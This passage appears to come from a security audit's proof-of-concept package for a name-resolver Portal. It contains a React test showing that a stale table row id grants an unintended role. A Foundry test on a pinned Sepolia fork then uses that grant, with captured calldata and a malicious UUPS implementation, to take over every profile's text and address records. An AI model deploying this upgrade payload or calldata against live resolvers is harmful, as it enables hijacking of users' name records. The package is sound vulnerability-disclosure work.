    console.log(`root_submitted_bitmap=0x${(decodedSave.args[0] as bigint).toString(16)}`)
    console.log(`root_submitted_account=${decodedSave.args[1]}`)
    console.log(`root_submitted_calldata=${saveIntent.request.data}`)
  })

  it('control: selecting B while its distinct row id remains 1 resets state and grants root ABI only', async () => {
    render(
      <QueryWrapper>
        <ResolverRolesTable
          roles={[accountARootRole, attackerBRootRole, ownerRootRole]}
          nodes={nodes}
          resolverAddress={RESOLVER}
          canManageRoles
        />
      </QueryWrapper>,
    )

    const editButtons = screen.getAllByRole('button', {
      name: 'Edit user roles',
    })
    expect(editButtons).toHaveLength(3)
    fireEvent.click(editButtons[0])
    await waitFor(() =>
      expect(isChecked(managerCheckbox('ROLE_UPGRADE'))).toBe(true),
    )
    fireEvent.click(screen.getAllByRole('button', { name: 'Close' })[0])
    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-content"]')).toBeNull(),
    )
    fireEvent.click(
      screen.getAllByRole('button', { name: 'Edit user roles' })[1],
    )
    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-title"]')?.textContent).toBe(
        truncateAddress(ATTACKER_B.toLowerCase() as Address, 6, 4),
      ),
    )
    expect(isChecked(managerCheckbox('ROLE_SET_PUBKEY'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_UPGRADE'))).toBe(false)
    expect(isChecked(managerCheckbox('ROLE_SET_ABI'))).toBe(false)

    fireEvent.click(managerCheckbox('ROLE_SET_ABI'))
    fireEvent.click(screen.getByRole('button', { name: 'Save' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )
    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(1))
    const decoded = decodeFunctionData({
      abi: roleAbi,
      data: mocks.startTransaction.mock.calls[0][0].request.data,
    })
    expect(decoded.functionName).toBe('grantRootRoles')
    expect(decoded.args[0]).toBe(resolverRoles.ROLE_SET_ABI)
    expect((decoded.args[1] as string).toLowerCase()).toBe(ATTACKER_B)
    console.log('negative_control_B_row_id=1')
    console.log('negative_control_state_reset=true')
    console.log('negative_control_stale_upgrade=false')
    console.log(`negative_control_submitted_bitmap=0x${(decoded.args[0] as bigint).toString(16)}`)
  })
})
```

### `portal-vitest.config.ts`

```ts
import { fileURLToPath } from 'node:url'

const portal = fileURLToPath(new URL('../../../apps/portal', import.meta.url))
const repo = fileURLToPath(new URL('../../..', import.meta.url))
const deps = `${portal}/node_modules`

export default {
  root: portal,
  test: {
    globals: true,
    environment: 'happy-dom',
    include: [
      fileURLToPath(new URL('./rowid-stale-save.test.tsx', import.meta.url)),
    ],
  },
  resolve: {
    alias: {
      '@': `${portal}/src`,
      wagmi: `${repo}/audit_workspace/renewed/lead034-rowid-stale-high/mocks/wagmi.ts`,
      '@ens-apps/transaction-manager': `${repo}/packages/transaction-manager/src`,
      '@ens-apps/utils': `${repo}/packages/utils/src`,
      '@testing-library/react': `${deps}/@testing-library/react`,
      '@tanstack/react-query': `${deps}/@tanstack/react-query`,
      '@tanstack/react-table': `${deps}/@tanstack/react-table`,
      viem: `${deps}/viem`,
      react: `${deps}/react`,
    },
    dedupe: ['react', 'react-dom', '@tanstack/react-query'],
  },
}
```

### `mocks/wagmi.ts`

```ts
export const useWalletClient = () => ({
  data: (globalThis as any).__lead034WalletClient,
})

export const usePublicClient = () =>
  (globalThis as any).__lead034PublicClient
```

### `fork-poc/test/Lead034RowIdStaleDeployedFork.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function warp(uint256 newTimestamp) external;
    function prank(address msgSender) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVerifiableFactoryLike {
    function deployProxy(address implementation, uint256 salt, bytes memory data) external returns (address);
    function verifyContract(address proxy) external view returns (address implementation);
}

interface IPermissionedResolverLike {
    function initialize(address admin, uint256 bitmap, bytes[] calldata setters) external;
    function grantRootRoles(uint256 bitmap, address account) external returns (bool);
    function revokeRootRoles(uint256 bitmap, address account) external returns (bool);
    function authorizeNameRoles(bytes calldata toName, uint256 bitmap, address account, bool grant)
        external
        returns (bool);
    function roles(uint256 resource, address account) external view returns (uint256);
    function setText(bytes32 node, string calldata key, string calldata value) external;
    function text(bytes32 node, string calldata key) external view returns (string memory);
}

interface IETHRegistrarLike {
    function MIN_COMMITMENT_AGE() external view returns (uint64);
    function isAvailable(string calldata label) external view returns (bool);
    function makeCommitment(
        string calldata label,
        address owner,
        bytes32 secret,
        address subregistry,
        address resolver,
        uint64 duration,
        bytes32 referrer
    ) external pure returns (bytes32);
    function commit(bytes32 commitment) external;
    function getRegisterPrice(string calldata label, uint64 duration, address paymentToken)
        external
        view
        returns (uint256 base, uint256 premium);
    function register(
        string calldata label,
        address owner,
        bytes32 secret,
        address subregistry,
        address resolver,
        uint64 duration,
        address paymentToken,
        bytes32 referrer
    ) external returns (uint256 tokenId);
}

interface IRegistryLike {
    function getResolver(string calldata label) external view returns (address);
    function findOwner(string calldata label) external view returns (address);
    function setResolver(uint256 anyId, address resolver) external;
}

interface IUniversalResolverLike {
    function resolve(bytes calldata name, bytes calldata data) external view returns (bytes memory, address);
}

/// @dev A malicious UUPS target accepted by both layers of the deployed
/// VerifiableFactory proxy. It proves implementation takeover by replacing
/// profile reads for every node behind the shared resolver.
contract Lead034MaliciousResolverImplementation {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address internal constant ATTACKER = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
    string internal constant REPLACEMENT = "ALL PROFILES CONTROLLED BY ATTACKER";

    function canUpgradeFrom(address) external pure returns (bool) {
        return true;
    }

    function proxiableUUID() external pure returns (bytes32) {
        return IMPLEMENTATION_SLOT;
    }

    function implementationMarker() external pure returns (bytes32) {
        return keccak256("LEAD-034 attacker implementation");
    }

    function text(bytes32, string calldata) external pure returns (string memory) {
        return REPLACEMENT;
    }

    function addr(bytes32) external pure returns (address payable) {
        return payable(ATTACKER);
    }
}

/// @dev All writes occur only on a pinned local Sepolia fork.
contract Lead034RowIdStaleDeployedForkTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    string constant RPC = "https://sepolia.gateway.tenderly.co";
    uint256 constant PINNED_BLOCK = 11_673_299;
    IVerifiableFactoryLike constant FACTORY = IVerifiableFactoryLike(0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef);
    address constant RESOLVER_IMPL = 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e;
    IETHRegistrarLike constant REGISTRAR = IETHRegistrarLike(0xa88553F454b77203B0D036A05c894d555EAAa2Cc);
    IRegistryLike constant ETH_REGISTRY = IRegistryLike(0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2);
    IUniversalResolverLike constant UNIVERSAL =
        IUniversalResolverLike(0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe);
    IERC20Like constant USDC = IERC20Like(0x768F42455A2D082E23ceeF7d51e5787C82d67a39);

    address constant VICTIM = 0x55582D44C579114274Fa062E07F09119E678bE7f;
    address constant ACCOUNT_A = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa;
    address constant ATTACKER_B = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
    string constant VICTIM_LABEL = "lead034-victim";
    string constant SECOND_LABEL = "lead034-second";
    string constant RECORD_KEY = "description";
    string constant ORIGINAL_TEXT = "Official victim profile";
    string constant ATTACKER_TEXT = "REPLACE OFFICIAL CONTACT DETAILS";
    string constant ROOT_TAKEOVER_TEXT = "ALL PROFILES CONTROLLED BY ATTACKER";

    uint64 constant DURATION = 365 days;
    uint256 constant ROLE_SET_TEXT = 1 << 4;
    uint256 constant ROLE_SET_PUBKEY = 1 << 12;
    uint256 constant ROLE_SET_ABI = 1 << 16;
    uint256 constant ROLE_UPGRADE = 1 << 124;
    uint256 constant ALL_ROLES = 0x1111111111111111111111111111111111111111111111111111111111111111;

    // Exact calls captured from the mounted Portal test. A is TanStack row 0,
    // then B becomes row 0 after the resolver-overview refetch.
    bytes constant PORTAL_NAME_REMOVE_A =
        hex"bbd9abb500000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000001010000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000140e6c6561643033342d76696374696d0365746800000000000000000000000000";
    bytes constant PORTAL_NAME_STALE_SAVE =
        hex"bbd9abb500000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000010010000000000000000000000000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000140e6c6561643033342d76696374696d0365746800000000000000000000000000";
    bytes constant PORTAL_NAME_RESET_SAVE =
        hex"bbd9abb500000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000010000000000000000000000000000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000140e6c6561643033342d76696374696d0365746800000000000000000000000000";
    bytes constant PORTAL_ROOT_REMOVE_A =
        hex"ce156e820000000000000000000000000000000010000000000000000000000000001000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    bytes constant PORTAL_ROOT_STALE_SAVE =
        hex"072d5d770000000000000000000000000000000010000000000000000000000000010000000000000000000000000000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    bytes constant PORTAL_ROOT_RESET_SAVE =
        hex"072d5d770000000000000000000000000000000000000000000000000000000000010000000000000000000000000000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    event log_named_address(string key, address val);
    event log_named_uint(string key, uint256 val);
    event log_named_bytes32(string key, bytes32 val);
    event log_named_string(string key, string val);

    IPermissionedResolverLike resolver;
    bytes victimName;
    bytes32 victimNode;
    bytes32 secondNode;
    uint256 victimResource;
    uint256 victimTokenId;
    uint256 secondTokenId;

    function setUp() public {
        vm.createSelectFork(RPC, PINNED_BLOCK);
        require(address(FACTORY).code.length > 0 && RESOLVER_IMPL.code.length > 0, "frozen deployment absent");
        require(address(UNIVERSAL).code.length > 0, "Universal Resolver absent");
        require(REGISTRAR.isAvailable(VICTIM_LABEL) && REGISTRAR.isAvailable(SECOND_LABEL), "labels unavailable");

        bytes[] memory setters = new bytes[](0);
        bytes memory init = abi.encodeCall(IPermissionedResolverLike.initialize, (VICTIM, ALL_ROLES, setters));
        vm.prank(VICTIM);
        resolver = IPermissionedResolverLike(
            FACTORY.deployProxy(RESOLVER_IMPL, uint256(keccak256("lead034-rowid-stale-resolver")), init)
        );

        victimTokenId = _register(VICTIM_LABEL, keccak256("lead034-victim-secret"));
        secondTokenId = _register(SECOND_LABEL, keccak256("lead034-second-secret"));
        victimName = _dns(VICTIM_LABEL);
        victimNode = _namehash(VICTIM_LABEL);
        secondNode = _namehash(SECOND_LABEL);
        victimResource = _resource(victimNode);

        vm.startPrank(VICTIM);
        resolver.setText(victimNode, RECORD_KEY, ORIGINAL_TEXT);
        resolver.setText(secondNode, RECORD_KEY, ORIGINAL_TEXT);
        vm.stopPrank();

        require(FACTORY.verifyContract(address(resolver)) == RESOLVER_IMPL, "unexpected initial implementation");
        require(ETH_REGISTRY.findOwner(VICTIM_LABEL) == VICTIM, "victim label owner mismatch");
        require(ETH_REGISTRY.findOwner(SECOND_LABEL) == VICTIM, "second label owner mismatch");
        require(ETH_REGISTRY.getResolver(VICTIM_LABEL) == address(resolver), "victim resolver mismatch");
        require(ETH_REGISTRY.getResolver(SECOND_LABEL) == address(resolver), "second resolver mismatch");
    }

    function test_NameScoped_StaleTextGrantLetsBReplacePersistentManagerDescription() public {
        _seedNameRows();

        _victimCallExpectBool(PORTAL_NAME_REMOVE_A, "name remove A failed");
        require(resolver.roles(victimResource, ACCOUNT_A) == 0, "name A survived remove");
        require(resolver.roles(victimResource, ATTACKER_B) == ROLE_SET_PUBKEY, "B had text before stale save");

        _victimCallExpectBool(PORTAL_NAME_STALE_SAVE, "name stale save failed");
        require(
            resolver.roles(victimResource, ATTACKER_B) == ROLE_SET_PUBKEY | ROLE_SET_TEXT | ROLE_SET_ABI,
            "unexpected B name roles"
        );

        vm.prank(ATTACKER_B);
        resolver.setText(victimNode, RECORD_KEY, ATTACKER_TEXT);
        require(_equal(resolver.text(victimNode, RECORD_KEY), ATTACKER_TEXT), "attacker text write failed");

        vm.prank(VICTIM);
        require(
            resolver.authorizeNameRoles(victimName, ROLE_SET_TEXT | ROLE_SET_ABI, ATTACKER_B, false),
            "name cleanup failed"
        );
        require(resolver.roles(victimResource, ATTACKER_B) == ROLE_SET_PUBKEY, "cleanup left added roles");
        require(_equal(resolver.text(victimNode, RECORD_KEY), ATTACKER_TEXT), "role cleanup repaired record");
        require(!_attackerCanSetText(victimNode, "SECOND WRITE"), "B wrote after role cleanup");

        emit log_named_uint("pinned_block", PINNED_BLOCK);
        emit log_named_uint("B_roles_before_stale_save", ROLE_SET_PUBKEY);
        emit log_named_uint("Portal_stale_name_grant", ROLE_SET_TEXT | ROLE_SET_ABI);
        emit log_named_string("persistent_description_after_role_cleanup", ATTACKER_TEXT);
    }

    function test_NameScoped_NegativeResetGrantsAbiOnlyAndBlocksText() public {
        _seedNameRows();
        _victimCallExpectBool(PORTAL_NAME_REMOVE_A, "name remove A failed");
        _victimCallExpectBool(PORTAL_NAME_RESET_SAVE, "name reset save failed");

        require(
            resolver.roles(victimResource, ATTACKER_B) == ROLE_SET_PUBKEY | ROLE_SET_ABI,
            "negative name roles mismatch"
        );
        require(!_attackerCanSetText(victimNode, ATTACKER_TEXT), "reset control granted text");
        require(_equal(resolver.text(victimNode, RECORD_KEY), ORIGINAL_TEXT), "negative control changed text");
        emit log_named_string("name_negative_control", "ABI-only grant blocks B setText");
    }

    function test_Root_StaleUpgradeCorruptsUniversalResolutionAndRequiresPerNameDetach() public {
        _seedRootRows();

        _victimCallExpectBool(PORTAL_ROOT_REMOVE_A, "root remove A failed");
        require(resolver.roles(0, ACCOUNT_A) == 0, "root A survived remove");
        require(resolver.roles(0, ATTACKER_B) == ROLE_SET_PUBKEY, "B had upgrade before stale save");

        _victimCallExpectBool(PORTAL_ROOT_STALE_SAVE, "root stale save failed");
        require(
            resolver.roles(0, ATTACKER_B) == ROLE_SET_PUBKEY | ROLE_SET_ABI | ROLE_UPGRADE,
            "B did not gain stale upgrade"
        );

        Lead034MaliciousResolverImplementation malicious = new Lead034MaliciousResolverImplementation();
        bytes memory upgradeCall = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(malicious), bytes(""));
        vm.prank(ATTACKER_B);
        (bool upgraded,) = address(resolver).call(upgradeCall);
        require(upgraded, "B upgradeToAndCall failed");
        require(FACTORY.verifyContract(address(resolver)) == address(malicious), "implementation did not change");

        _assertDirectTakeover(address(malicious));
        _assertUniversalTakeover();
        _assertUniversalAddressTakeover();
        _assertInPlaceRollbackFails(address(malicious));
        address clean = _deployCleanResolverAndDetachFirstName();
        _assertPerNameRecovery(clean);

        emit log_named_uint("B_root_roles_before_stale_save", ROLE_SET_PUBKEY);
        emit log_named_uint("Portal_stale_root_grant", ROLE_SET_ABI | ROLE_UPGRADE);
        emit log_named_address("original_implementation", RESOLVER_IMPL);
        emit log_named_address("attacker_implementation", address(malicious));
    }

    function _assertDirectTakeover(address malicious) internal {
        Lead034MaliciousResolverImplementation taken = Lead034MaliciousResolverImplementation(address(resolver));
        bytes32 marker = taken.implementationMarker();
        string memory first = taken.text(victimNode, RECORD_KEY);
        string memory second = taken.text(secondNode, RECORD_KEY);
        address replacementAddress = taken.addr(victimNode);
        require(marker == keccak256("LEAD-034 attacker implementation"), "malicious marker absent");
        require(_equal(first, ROOT_TAKEOVER_TEXT) && _equal(second, ROOT_TAKEOVER_TEXT), "multi-name takeover absent");
        require(replacementAddress == ATTACKER_B && malicious == FACTORY.verifyContract(address(resolver)), "takeover mismatch");
        emit log_named_bytes32("implementation_marker", marker);
        emit log_named_string("first_victim_name_text", first);
        emit log_named_string("second_victim_name_text", second);
        emit log_named_address("victim_name_addr", replacementAddress);
    }

    function _assertUniversalTakeover() internal {
        (bytes memory firstAnswer, address firstUsed) = UNIVERSAL.resolve(
            victimName, abi.encodeWithSignature("text(bytes32,string)", victimNode, RECORD_KEY)
        );
        (bytes memory secondAnswer, address secondUsed) = UNIVERSAL.resolve(
            _dns(SECOND_LABEL), abi.encodeWithSignature("text(bytes32,string)", secondNode, RECORD_KEY)
        );
        require(firstUsed == address(resolver) && secondUsed == address(resolver), "wrong resolver path");
        require(
            _equal(abi.decode(firstAnswer, (string)), ROOT_TAKEOVER_TEXT)
                && _equal(abi.decode(secondAnswer, (string)), ROOT_TAKEOVER_TEXT),
            "Universal Resolver did not expose takeover"
        );
        emit log_named_string("deployed_Universal_Resolver_text", abi.decode(firstAnswer, (string)));
    }

    function _assertUniversalAddressTakeover() internal {
        (bytes memory answer, address used) =
            UNIVERSAL.resolve(victimName, abi.encodeWithSignature("addr(bytes32)", victimNode));
        require(used == address(resolver), "address query used wrong resolver");
        require(abi.decode(answer, (address)) == ATTACKER_B, "Universal address redirect absent");
        emit log_named_address("deployed_Universal_Resolver_addr", abi.decode(answer, (address)));
    }

    function _assertInPlaceRollbackFails(address malicious) internal {
        bytes memory restoreCall = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", RESOLVER_IMPL, bytes(""));
        vm.prank(VICTIM);
        (bool restored,) = address(resolver).call(restoreCall);
        require(!restored, "unexpected in-place rollback");
        require(FACTORY.verifyContract(address(resolver)) == malicious, "old proxy was restored");
        emit log_named_string("in_place_rollback", "failed as expected");
    }

    function _deployCleanResolverAndDetachFirstName() internal returns (address cleanAddress) {
        bytes[] memory setters = new bytes[](0);
        bytes memory init = abi.encodeCall(IPermissionedResolverLike.initialize, (VICTIM, ALL_ROLES, setters));
        vm.prank(VICTIM);
        cleanAddress = FACTORY.deployProxy(RESOLVER_IMPL, uint256(keccak256("lead034-clean-recovery")), init);
        vm.prank(VICTIM);
        ETH_REGISTRY.setResolver(victimTokenId, cleanAddress);
        require(ETH_REGISTRY.getResolver(VICTIM_LABEL) == cleanAddress, "first label not detached");
        require(ETH_REGISTRY.getResolver(SECOND_LABEL) == address(resolver), "second label detached unexpectedly");
    }

    function _assertPerNameRecovery(address clean) internal {
        (bytes memory recoveredAnswer, address recoveredUsed) = UNIVERSAL.resolve(
            victimName, abi.encodeWithSignature("text(bytes32,string)", victimNode, RECORD_KEY)
        );
        (bytes memory stillCorruptAnswer, address stillCorruptUsed) = UNIVERSAL.resolve(
            _dns(SECOND_LABEL), abi.encodeWithSignature("text(bytes32,string)", secondNode, RECORD_KEY)
        );
        require(recoveredUsed == clean, "public path did not use clean resolver");
        require(_equal(abi.decode(recoveredAnswer, (string)), ""), "first label remained corrupt");
        require(stillCorruptUsed == address(resolver), "second public path changed unexpectedly");
        require(_equal(abi.decode(stillCorruptAnswer, (string)), ROOT_TAKEOVER_TEXT), "second label did not remain corrupt");
        emit log_named_address("first_name_recovery_resolver", recoveredUsed);
        emit log_named_string("second_name_after_first_detach", abi.decode(stillCorruptAnswer, (string)));
    }

    function test_Root_NegativeResetGrantsAbiOnlyAndBlocksUpgrade() public {
        _seedRootRows();
        _victimCallExpectBool(PORTAL_ROOT_REMOVE_A, "root remove A failed");
        _victimCallExpectBool(PORTAL_ROOT_RESET_SAVE, "root reset save failed");

        require(
            resolver.roles(0, ATTACKER_B) == ROLE_SET_PUBKEY | ROLE_SET_ABI,
            "negative root roles mismatch"
        );
        Lead034MaliciousResolverImplementation malicious = new Lead034MaliciousResolverImplementation();
        bytes memory upgradeCall = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(malicious), bytes(""));
        vm.prank(ATTACKER_B);
        (bool upgraded,) = address(resolver).call(upgradeCall);
        require(!upgraded, "ABI-only control allowed upgrade");
        require(FACTORY.verifyContract(address(resolver)) == RESOLVER_IMPL, "negative control changed implementation");
        require(_equal(resolver.text(victimNode, RECORD_KEY), ORIGINAL_TEXT), "negative control changed record");
        emit log_named_string("root_negative_control", "ABI-only grant blocks B upgradeToAndCall");
    }

    function _seedNameRows() internal {
        vm.startPrank(VICTIM);
        // This fork seeds only the contract states needed to test the captured
        // calls and their consequences. The mounted Portal fixture separately
        // models an observed reachable A-before-B response and the refetch.
        require(resolver.authorizeNameRoles(victimName, ROLE_SET_PUBKEY, ATTACKER_B, true), "seed name B failed");
        require(
            resolver.authorizeNameRoles(victimName, ROLE_SET_PUBKEY | ROLE_SET_TEXT, ACCOUNT_A, true),
            "seed name A failed"
        );
        vm.stopPrank();
    }

    function _seedRootRows() internal {
        vm.startPrank(VICTIM);
        require(resolver.grantRootRoles(ROLE_SET_PUBKEY, ATTACKER_B), "seed root B failed");
        require(resolver.grantRootRoles(ROLE_SET_PUBKEY | ROLE_UPGRADE, ACCOUNT_A), "seed root A failed");
        vm.stopPrank();
    }

    function _victimCallExpectBool(bytes memory callData, string memory errorMessage) internal {
        vm.prank(VICTIM);
        (bool ok, bytes memory result) = address(resolver).call(callData);
        require(ok && result.length == 32 && abi.decode(result, (bool)), errorMessage);
    }

    function _attackerCanSetText(bytes32 node, string memory value) internal returns (bool) {
        vm.prank(ATTACKER_B);
        (bool ok,) =
            address(resolver).call(abi.encodeCall(IPermissionedResolverLike.setText, (node, RECORD_KEY, value)));
        return ok;
    }

    function _register(string memory label, bytes32 secret) internal returns (uint256 tokenId) {
        bytes32 commitment =
            REGISTRAR.makeCommitment(label, VICTIM, secret, address(0), address(resolver), DURATION, bytes32(0));
        uint256 committedAt = block.timestamp;
        vm.prank(VICTIM);
        REGISTRAR.commit(commitment);
        vm.warp(committedAt + REGISTRAR.MIN_COMMITMENT_AGE());
        (uint256 base, uint256 premium) = REGISTRAR.getRegisterPrice(label, DURATION, address(USDC));
        uint256 price = base + premium;
        require(USDC.balanceOf(VICTIM) >= price, "victim lacks test USDC");
        vm.startPrank(VICTIM);
        require(USDC.approve(address(REGISTRAR), price), "approve failed");
        tokenId = REGISTRAR.register(
            label, VICTIM, secret, address(0), address(resolver), DURATION, address(USDC), bytes32(0)
        );
        vm.stopPrank();
    }

    function _dns(string memory label) internal pure returns (bytes memory) {
        bytes memory raw = bytes(label);
        return abi.encodePacked(bytes1(uint8(raw.length)), raw, bytes1(uint8(3)), "eth", bytes1(0));
    }

    function _namehash(string memory label) internal pure returns (bytes32) {
        bytes32 ethNode = keccak256(abi.encodePacked(bytes32(0), keccak256("eth")));
        return keccak256(abi.encodePacked(ethNode, keccak256(bytes(label))));
    }

    function _resource(bytes32 node) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(node, bytes32(0))));
    }

    function _equal(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }
}
```

### `fork-poc/foundry.toml`

```toml
[profile.default]
src = "src"
test = "test"
out = "out"
cache_path = "cache"
solc_version = "0.8.30"
evm_version = "prague"
optimizer = true
optimizer_runs = 200
```

### `fork-poc/src/Placeholder.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract Placeholder {}
```

### Run the Portal layer

From the repository root:

```sh
apps/portal/node_modules/.bin/vitest run \
  --config audit_workspace/renewed/lead034-rowid-stale-high/portal-vitest.config.ts \
  --reporter=verbose
```

Expected result: `1` file and `3` tests pass. The decisive output is:

```
root_initial_tanstack_row_ids=A:0,B:1,owner:2
root_refetched_tanstack_row_ids=B:0,owner:1
root_current_sidebar_account=0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
root_stale_upgrade_checkbox_before_user_action=true
root_only_intentionally_toggled_checkbox=ROLE_SET_ABI
root_submitted_function=grantRootRoles
root_submitted_bitmap=0x10000000000000000000000000010000
root_submitted_account=0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB
negative_control_submitted_bitmap=0x10000
```

### Run the deployed-fork layer

```sh
cd audit_workspace/renewed/lead034-rowid-stale-high/fork-poc
forge test --offline -vv
```

Expected result: `4 passed; 0 failed`. The root exploit prints:

```
first_victim_name_text: ALL PROFILES CONTROLLED BY ATTACKER
second_victim_name_text: ALL PROFILES CONTROLLED BY ATTACKER
victim_name_addr: 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB
deployed_Universal_Resolver_text: ALL PROFILES CONTROLLED BY ATTACKER
deployed_Universal_Resolver_addr: 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB
in_place_rollback: failed as expected
second_name_after_first_detach: ALL PROFILES CONTROLLED BY ATTACKER
B_root_roles_before_stale_save: 4096
Portal_stale_root_grant: 21267647932558653966460912964485578752
original_implementation: 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
```

The name-scoped companion also proves the same state-transfer primitive grants stale Text plus intended ABI, lets B replace the description, and leaves the unauthorized record change after role cleanup. The root negative control proves ABI alone cannot upgrade.
